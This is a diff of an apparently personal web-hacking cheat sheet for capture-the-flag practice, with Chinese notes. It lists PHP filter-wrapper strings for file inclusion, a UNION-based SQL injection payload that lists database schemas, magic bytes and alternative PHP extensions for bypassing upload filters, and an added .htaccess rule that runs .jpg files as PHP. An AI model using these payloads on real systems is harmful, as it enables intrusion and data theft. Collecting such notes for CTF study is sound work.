@@ -1,6 +1,7 @@
 set sql_mode=pipes_as_concat
 与或非 && ||  !
-php://filter/convert.base64-encode/resource=f
+php://filter/convert.base64-encode/resource=
+php://filter/read=convert.base64-encode/resource=
 handler
 var_dump()
 union select 1,2, group_concat(schema_name) from information_schema.schemata #
@@ -30,6 +31,10 @@ image/jpeg
 JPG ：FF D8 FF E0 00 10 4A 46 49 46
 GIF(相当于文本的GIF89a)：47 49 46 38 39 61
 PNG： 89 50 4E 47
+<FilesMatch "\.jpg">
+SetHandler application/x-httpd-php
+</FilesMatch
+
 
 php/php3/php4/php5/phtml/pht
 
